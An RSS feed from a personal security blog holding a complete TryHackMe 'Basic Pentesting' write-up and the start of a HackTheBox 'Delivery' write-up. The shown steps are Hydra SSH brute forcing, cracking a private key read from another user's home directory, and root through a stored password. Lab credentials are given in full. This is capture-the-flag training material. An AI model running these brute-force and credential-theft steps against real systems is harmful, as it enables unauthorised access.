<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Password-cracking on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/password-cracking/</link>
    <description>Recent content in Password-cracking on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 18 Jun 2021 19:15:35 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/password-cracking/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>TryHackMe - Basic Pentesting</title>
      <link>https://fahmifj.github.io/tryhackme/basic-pentesting/</link>
      <pubDate>Fri, 18 Jun 2021 19:15:35 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/tryhackme/basic-pentesting/</guid>
      <description>This is a machine that allows you to practise web app hacking and privilege escalation </description>
      <content:encoded><![CDATA[<fieldset>
<legend>Room Information </legend>
<ul>
<li><strong>Name:</strong> <a href="https://tryhackme.com/room/basicpentestingjt">Basic Pentesting</a></li>
<li><strong>Category:</strong> Boot2root</li>
<li><strong>Type</strong>: Challenge/CTF</li>
<li><strong>Difficulty:</strong> Easy</li>
<li><strong>Tools</strong>:
<ul>
<li>Nmap</li>
<li>Gobuster</li>
<li>John the Ripper</li>
<li>smbclient</li>
</ul>
</li>
<li><strong>Skills Learned</strong>
<ul>
<li>Basics of enumeration</li>
<li>Brute-force attack</li>
</ul>
</li>
</ul>
</fieldset>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full scan discovers six open ports: SSH (22), HTTP (80), SMB (139 &amp; 445), Apache JServ Protocol (8009), and Apache Tomcat (8080).</p>
<p><div class="img-container"><img src="imgs/image-20210530002323622.png" alt="image-20210530002323622"  /></div>
</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Anonymous login is allowed on SMB.</p>
<p><div class="img-container"><img src="imgs/image-20210530004538478-1624087102246.png" alt="image-20210530004538478"  /></div>
</p>
<p>Accessing <code>anonymous</code> share with anonymous logon finds a text file called <code>staff.txt</code>. I&rsquo;ll grab that file to my machine</p>
<p><div class="img-container"><img src="imgs/image-20210530004922142.png" alt="image-20210530004922142"  /></div>
</p>
<p>The contents of <code>staff.txt</code> reveals two potential usernames: <code>jan</code> and <code>kay</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530004937052.png" alt="image-20210530004937052"  /></div>
</p>
<h3 id="tcp-80---web">TCP 80 - Web</h3>
<p>Poking the web with <code>curl</code> finds out that it is under maintenance.</p>
<p><div class="img-container"><img src="imgs/image-20210530004040209.png" alt="image-20210530004040209"  /></div>
</p>
<h4 id="gobuster">Gobuster</h4>
<p><code>Gobuster</code> scan discovers one hidden directory called <code>development</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115»
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://10.10.67.164/ -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt gobuster/gobuster-S-80 --no-error -z
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://10.10.67.164/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   <span class="m">404</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/29 13:43:47 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/development          <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 318<span class="o">]</span> <span class="o">[</span>--&gt; http://10.10.67.164/development/<span class="o">]</span>
</span></span></code></pre></div><h4 id="development">/development</h4>
<p>The web has a directory listing enabled on <code>/development</code>, and there are two text files in that directory:  <code>dev.txt</code> and <code>j.txt</code></p>
<p><div class="img-container"><img src="imgs/image-20210530010100831.png" alt="image-20210530010100831"  /></div>
</p>
<p><code>j.txt</code>  contains a note from K to J.</p>
<p><div class="img-container"><img src="imgs/image-20210530010150205.png" alt="image-20210530010150205"  /></div>
</p>
<p>From the previous SMB enumeration, K and J here are probably Kay and Jan. If so, I could try a brute-force attack on user Jay, since Kay is pointing out that Jan has a weak password.</p>
<p><code>dev.txt</code> contains about project development logs.</p>
<p><div class="img-container"><img src="imgs/image-20210530010131055.png" alt="image-20210530010131055"  /></div>
</p>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>There are some potential exploits for Apache Structs 2.5.12, which I could try later.</p>
<p><div class="img-container"><img src="imgs/image-20210619142047338.png" alt="image-20210619142047338"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<p>For foothold, I have two options: brute forcing SSH and exploiting Apache Struts.</p>
<p>Brute force might take some time, so I&rsquo;ll leave it on the background and start with Apache Struts.</p>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="apache-struts-rce-cve-2017-9805">Apache Struts RCE CVE-2017-9805</h4>
<p>Metasploit also has an <a href="https://www.rapid7.com/db/modules/exploit/multi/http/struts2_rest_xstream/">exploit module</a> for this, so I&rsquo;ll  fire up  <code>metasploit</code>. But, first, I need to find out the URI of the Apache Struts.</p>
<p>Looking back to the <code>dev.txt</code> file, it seems Kay uses this <a href="https://mvnrepository.com/artifact/org.apache.struts/struts2-showcase/2.5.12">example showcase</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210619131650429.png" alt="image-20210619131650429"  /></div>
</p>
<p>I also came across this <a href="https://samsclass.info/124/proj14/p10xstruts.htm">blog post</a> and found this:</p>
<p><div class="img-container"><img src="imgs/image-20210619132136356.png" alt="image-20210619132136356"  /></div>
</p>
<p>I typed <code>http://10.10.67.164/struts2-rest-showcase-2.5.12/</code> in my browser, and it resolved to this page.</p>
<p><div class="img-container"><img src="imgs/image-20210619132449500.png" alt="image-20210619132449500"  /></div>
</p>
<p>I tried it with <code>metasploit</code> and it worked!</p>
<p><div class="img-container"><img src="imgs/image-20210619142842848.png" alt="image-20210619142842848"  /></div>
</p>
<h3 id="shell-as-jan">Shell as jan</h3>
<h4 id="ssh-brute-force">SSH Brute Force</h4>
<p>It turns out <code>Hydra</code> finds Jan&rsquo;s SSH password in less than 2 minutes. The password is <code>armando</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ hydra -l jan -P /opt/SecLists/Passwords/Common-Credentials/best1050.txt ssh://10.10.245.112 
</span></span><span class="line"><span class="cl">Hydra v9.0 <span class="o">(</span>c<span class="o">)</span> <span class="m">2019</span> by van Hauser/THC - Please <span class="k">do</span> not use in military or secret service organizations, or <span class="k">for</span> illegal purposes.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"><span class="o">[</span>22<span class="o">][</span>ssh<span class="o">]</span> host: 10.10.245.112   login: jan   password: armando
</span></span><span class="line"><span class="cl"><span class="m">1</span> of <span class="m">1</span> target successfully completed, <span class="m">1</span> valid password found
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Hydra <span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span> finished at 2021-05-29 14:20:56
</span></span></code></pre></div><p>Now I can login as Jan with SSH client.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ ssh jan@10.10.245.112 
</span></span><span class="line"><span class="cl">jan@10.10.245.112<span class="err">&#39;</span>s password: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 15:55:45 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">jan@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>jan<span class="o">)</span>
</span></span></code></pre></div><p>Since <code>jan</code> has SSH login, I&rsquo;ll definitely use this for enumeration.</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In Kay&rsquo;s home directory there is  a readable SSH key</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ ls -la
</span></span><span class="line"><span class="cl">total <span class="m">20</span>
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">2</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> .
</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">5</span> kay kay <span class="m">4096</span> Apr <span class="m">23</span>  <span class="m">2018</span> ..
</span></span><span class="line"><span class="cl">-rw-rw-r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">23</span>  <span class="m">2018</span> authorized_keys
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay <span class="m">3326</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> kay kay  <span class="m">771</span> Apr <span class="m">19</span>  <span class="m">2018</span> id_rsa.pub
</span></span></code></pre></div><p>I tried the key for login locally as user Kay but it wanted passphrase, so I&rsquo;ll just grab the private key for cracking.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">jan@basic2:/home/kay/.ssh$ cat id_rsa
</span></span><span class="line"><span class="cl">-----BEGIN RSA PRIVATE KEY-----                                                      
</span></span><span class="line"><span class="cl">Proc-Type: 4,ENCRYPTED                                                               
</span></span><span class="line"><span class="cl">DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75                               
</span></span><span class="line"><span class="cl">                                                                                     
</span></span><span class="line"><span class="cl">IoNb/J0q2Pd56EZ23oAaJxLvhuSZ1crRr4ONGUAnKcRxg3+9vn6xcujpzUDuUtlZ                     
</span></span><span class="line"><span class="cl">o9dyIEJB4wUZTueBPsmb487RdFVkTOVQrVHty1K2aLy2Lka2Cnfjz8Llv+FMadsN                     
</span></span><span class="line"><span class="cl">XRvjw/HRiGcXPY8B7nsA1eiPYrPZHIH3QOFIYlSPMYv79RC65i6frkDSvxXzbdfX                     
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">4eaCAHk1hUL3eseN3ZpQWRnDGAAPxH+LgPyE8Sz1it8aPuP8gZABUFjBbEFMwNYB
</span></span><span class="line"><span class="cl">e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
</span></span><span class="line"><span class="cl">3Jt1/ZW3XCb76R75sG5h6Q4N8gu5c/M0cdq16H9MHwpdin9OZTqO2zNxFvpuXthY
</span></span><span class="line"><span class="cl">-----END RSA PRIVATE KEY-----
</span></span></code></pre></div><h4 id="cracking-id_rsa">Cracking id_rsa</h4>
<p>I&rsquo;ll convert Kay&rsquo;s <code>id_rsa</code> to hash using <code>ssh2john.py</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ /usr/share/john/ssh2john.py kay_rsa &gt; kay_rsa.hash<span class="p">;</span> cat kay_rsa.hash
</span></span><span class="line"><span class="cl">kay_rsa:<span class="nv">$sshng$1$16$6</span>ABA7DE35CDB65070B92C1F760E2FE75<span class="nv">$2352$22835</span>bfc9d2ad8f779e84676de801a2712e...&lt;SNIP&gt;...
</span></span></code></pre></div><p><code>JtR</code> finds the password to be <code>beeswax</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210530013632605.png" alt="image-20210530013632605"  /></div>
</p>
<h4 id="ssh---kay">SSH - Kay</h4>
<p>Interestingly, Kay&rsquo;s is in the sudo group.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «basic-pentesting» «10.9.30.115» 
</span></span><span class="line"><span class="cl">$ chmod <span class="m">600</span> kay_rsa <span class="o">&amp;&amp;</span> ssh -i kay_rsa kay@10.10.245.112
</span></span><span class="line"><span class="cl">Enter passphrase <span class="k">for</span> key <span class="s1">&#39;kay_rsa&#39;</span>: 
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 16.04.4 LTS <span class="o">(</span>GNU/Linux 4.4.0-119-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">Last login: Mon Apr <span class="m">23</span> 16:04:07 <span class="m">2018</span> from 192.168.56.102
</span></span><span class="line"><span class="cl">kay@basic2:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>kay<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,110<span class="o">(</span>lxd<span class="o">)</span>,115<span class="o">(</span>lpadmin<span class="o">)</span>,116<span class="o">(</span>sambashare<span class="o">)</span>
</span></span></code></pre></div><p>From here, I only need Kay&rsquo;s password.</p>
<h4 id="su---root">SU - root</h4>
<p>In Kay&rsquo;s home directory, there is a file called <code>pass.bak</code>. It contains the following string:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ cat pass.bak 
</span></span><span class="line"><span class="cl">heresareallystrongpasswordthatfollowsthepasswordpolicy<span class="nv">$$</span>
</span></span></code></pre></div><p>I tried the string as Kay&rsquo;s password on <code>sudo su -</code> and it worked.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">kay@basic2:~$ sudo su -
</span></span><span class="line"><span class="cl">root@basic2:~# id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span><span class="line"><span class="cl">root@basic2:~# ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> root root <span class="m">1017</span> Apr <span class="m">23</span>  <span class="m">2018</span> flag.txt
</span></span></code></pre></div><p>The flag:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Congratulations! You&#39;ve completed this challenge. There are two ways (that I&#39;m aware of) to gain 
</span></span><span class="line"><span class="cl">a shell, and two ways to privesc. I encourage you to find them all!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">If you&#39;re in the target audience (newcomers to pentesting), I hope you learned something. A few
</span></span><span class="line"><span class="cl">takeaways from this challenge should be that every little bit of information you can find can be
</span></span><span class="line"><span class="cl">valuable, but sometimes you&#39;ll need to find several different pieces of information and combine
</span></span><span class="line"><span class="cl">them to make them useful. Enumeration is key! Also, sometimes it&#39;s not as easy as just finding
</span></span><span class="line"><span class="cl">an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
</span></span><span class="line"><span class="cl">in this series). Usually you&#39;ll have to dig deeper to find things that aren&#39;t as obvious, and
</span></span><span class="line"><span class="cl">therefore might&#39;ve been overlooked by administrators.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you&#39;ll send 
</span></span><span class="line"><span class="cl">me a link! I can be reached at josiah@vt.edu. If you&#39;ve got questions or feedback, please reach
</span></span><span class="line"><span class="cl">out to me.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Happy hacking!
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Delivery</title>
      <link>https://fahmifj.github.io/hackthebox/delivery/</link>
      <pubDate>Sat, 22 May 2021 20:12:33 +0000</pubDate>
      
      <guid>https://fahmifj.github.io/hackthebox/delivery/</guid>
      <description>Exploiting a logic flaw called TicketTrick</description>
      <content:encoded><![CDATA[<p>Delivery from HackTheBox is all about exploiting a logic flaw called TicketTrick which was discovered by <a href="https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c">Inti De Ceukelaire</a>.</p>
<p>On this machine, there is a helpdesk ticketing system that gives an unauthenticated user a temporary email with a legitimate company domain. Using that email, I&rsquo;m able to register at Mattermost and gain access to the company private communication channel. The conversation in the channel leaks a set of SSH credentials and a password in which its variant is being used in the system. There is a set of database credentials in the Mattermost configuration file, which can be used to dump the password hash of the root account. After generating a variant of the exposed password with hashcat, I&rsquo;m able to crack the password and obtain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>TicketTrick</li>
<li>Generating wordlist using hashcat</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li><a href="https://hashcat.net/">hashcat</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p><code>nmap</code> full TCP scan discovers three open ports: An SSH on port 22, an HTTP server on port 80, and an unknown service on port 8065</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ nmap -p- --min-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222 
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-21 14:58 EDT
</span></span><span class="line"><span class="cl">....
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE REASON         VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span></span><span class="line"><span class="cl">80/tcp   open  http    syn-ack ttl <span class="m">63</span> nginx 1.14.2
</span></span><span class="line"><span class="cl">8065/tcp open  unknown syn-ack ttl <span class="m">63</span>
</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class="line"><span class="cl">SF-Port8065-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/21%Time<span class="o">=</span>60A80336%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
</span></span><span class="line"><span class="cl">SF:nericLines,67,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20Request&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,DF3,<span class="s2">&#34;HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\
</span></span></span><span class="line"><span class="cl"><span class="s2">....
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">→ root@kali «delivery» «10.10.14.70» 
</span></span></span><span class="line"><span class="cl"><span class="s2"></span>$<span class="s2"> nmap -p22,80,8065 --min-rate 1000 -sC --reason -oA nmap/10-tcp-allport-delivery 10.10.10.222
</span></span></span><span class="line"><span class="cl"><span class="s2">Starting Nmap 7.80 ( https://nmap.org ) at 2021-05-21 15:06 EDT
</span></span></span><span class="line"><span class="cl"><span class="s2">Nmap scan report for 10.10.10.222
</span></span></span><span class="line"><span class="cl"><span class="s2">Host is up, received echo-reply ttl 63 (0.45s latency).
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">PORT     STATE SERVICE REASON
</span></span></span><span class="line"><span class="cl"><span class="s2">22/tcp   open  ssh     syn-ack ttl 63
</span></span></span><span class="line"><span class="cl"><span class="s2">| ssh-hostkey: 
</span></span></span><span class="line"><span class="cl"><span class="s2">|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
</span></span></span><span class="line"><span class="cl"><span class="s2">|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
</span></span></span><span class="line"><span class="cl"><span class="s2">|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
</span></span></span><span class="line"><span class="cl"><span class="s2">80/tcp   open  http    syn-ack ttl 63
</span></span></span><span class="line"><span class="cl"><span class="s2">|_http-title: Welcome
</span></span></span><span class="line"><span class="cl"><span class="s2">8065/tcp open  unknown syn-ack ttl 63
</span></span></span></code></pre></div><p>I can clearly see the fingerprint of port 8065 indicate that it&rsquo;s a HTTP server. I can confirm it with <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ curl -sI 10.10.10.222:8065
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">405</span> Method Not Allowed
</span></span><span class="line"><span class="cl">Date: Fri, <span class="m">21</span> May <span class="m">2021</span> 19:09:14 GMT
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>This page is a static website.</p>
<p><div class="img-container"><img src="imgs/image-20210522022202624.png" alt="image-20210522022202624"  /></div>
</p>
<p>The text “HELPDESK” points to <code>http://helpdesk.delivery.htb/ </code>.  Clicking on the &ldquo;CONTACT US&rdquo; flips the homepage to this views:</p>
<p><div class="img-container"><img src="imgs/image-20210522022535948.png" alt="image-20210522022535948"  /></div>
</p>
<p>The text “MatterMost server” points to <code>http://delivery.htb:8065</code>.</p>
<p>I can use <code>curl</code> and <code>grep</code> command to grab all the links/URL from this page.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ curl -s 10.10.10.222 <span class="p">|</span> grep -Eo <span class="s1">&#39;href=&#34;[^\&#34;]+&#34;&#39;</span> <span class="p">|</span> grep -v <span class="s1">&#39;#&#39;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/main.css&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/ie9.css&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;assets/css/noscript.css&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://helpdesk.delivery.htb&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://helpdesk.delivery.htb&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;http://delivery.htb:8065&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nv">href</span><span class="o">=</span><span class="s2">&#34;https://html5up.net&#34;</span>
</span></span></code></pre></div><p>I’ll add the newly discovered hostnames to my <code>/etc/hosts</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.222 delivery.htb helpdesk.delivery.htb&#39;</span> &gt; /etc/hosts
</span></span></code></pre></div><p>Before moving on, we can poke the hostnames and compare their page size to check if this site has different content when we visit it with a hostname.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.222/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10850</span>
</span></span><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ curl -s http://delivery.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">10850</span>
</span></span><span class="line"><span class="cl">→ root@kali «delivery» «10.10.14.70» 
</span></span><span class="line"><span class="cl">$ curl -s http://helpdesk.delivery.htb/ <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">4933</span>
</span></span></code></pre></div><p>There is only one page that has different in size.</p>
<p>I did a <code>gobuster</code> scan but find nothing useful in the results, so I&rsquo;ll move to the next prt.</p>
<h3 id="tcp-80---helpdeskdeliveryhtb">TCP 80 - helpdesk.delivery.htb</h3>
<p>There is a helpdesk ticketing system here. At the bottom of the page it shows it is powered by <a href="https://osticket.com/">osTicket</a>.</p>
<p><div class="img-container"><img src="imgs/image-20210522024708233.png" alt="image-20210522024708233"  /></div>
</p>
<p>The &ldquo;Open a New Ticket&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522025616599.png" alt="image-20210522025616599"  /></div>
</p>
<p>The &ldquo;Check Ticket Status&rdquo; menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522025147588.png" alt="image-20210522025147588"  /></div>
</p>
<h4 id="open-a-new-ticket">Open a New Ticket</h4>
<p>According to the message at <code>http://delivery.htb/#contact-us</code>, guest user seems to be allowed to create a ticket here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">For unregistered users, please use our HelpDesk to get in touch with our team. 
</span></span><span class="line"><span class="cl">Once you have an @delivery.htb email address, you&#39;ll be able to have access to our MatterMost server.
</span></span></code></pre></div><p>I&rsquo;ll create one.</p>
<p><div class="img-container"><img src="imgs/image-20210522030005601.png" alt="image-20210522030005601"  /></div>
</p>
<p>Once the ticket request is submitted, it notifies that the ticket has been created.</p>
<p><div class="img-container"><img src="imgs/image-20210522030208711.png" alt="image-20210522030208711"  /></div>
</p>
<p>Besides the ticket id, it also gives us a temporary email with domain of <code>delivery.htb</code>, and I&rsquo;ll note that:</p>
<ul>
<li>Ticket : 4709941</li>
<li>Email: <a href="mailto:4709941@delivery.htb">4709941@delivery.htb</a>.</li>
</ul>
<p>The created ticket can be accessed/viewed on “Check Ticket Status” menu.</p>
<p><div class="img-container"><img src="imgs/image-20210522030510810.png" alt="image-20210522030510810"  /></div>
</p>
<h4 id="finding-vulnerabilities">Finding vulnerabilities</h4>
<p>The app source code is available on Github: <a href="https://github.com/osTicket/osTicket">https://github.com/osTicket/osTicket</a>. But, it seems I&rsquo;ll need an admin access to find the exact version.</p>
<p>On Exploit-DB, the available exploits mostly involve XSS that requires a user interaction, and there is no indication for that in this box, so let’s move to the next one.</p>
<p><div class="img-container"><img src="imgs/image-20210522031957741.png" alt="image-20210522031957741"  /></div>
</p>
<h3 id="tcp-8065--mattermost">TCP 8065 — Mattermost</h3>
<p>There is an instance of Mattermost here and it requires an account.</p>
